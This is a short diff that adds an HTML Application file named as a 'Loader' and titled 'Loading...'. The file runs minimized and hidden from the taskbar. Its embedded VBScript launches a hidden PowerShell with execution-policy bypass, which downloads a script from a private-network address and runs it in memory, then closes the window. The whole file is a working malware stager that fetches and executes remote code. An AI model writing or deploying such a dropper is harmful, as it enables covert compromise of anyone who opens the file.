@@ -1,0 +1,17 @@
+<html>
+<head>
+<title>Loading...</title>
+<HTA:APPLICATION ID="l"
+    APPLICATIONNAME="Loader"
+    WINDOWSTATE="minimize"
+    SHOWINTASKBAR="no"
+/>
+</head>
+<body>
+<script language="VBScript">
+    Set sh = CreateObject("WScript.Shell")
+    sh.Run "powershell.exe -nop -w hidden -ep bypass -c ""IEX(New-Object Net.WebClient).DownloadString('http://192.168.131.130:8888/payload.ps1')""", 0, False
+    Self.Close
+</script>
+</body>
+</html>
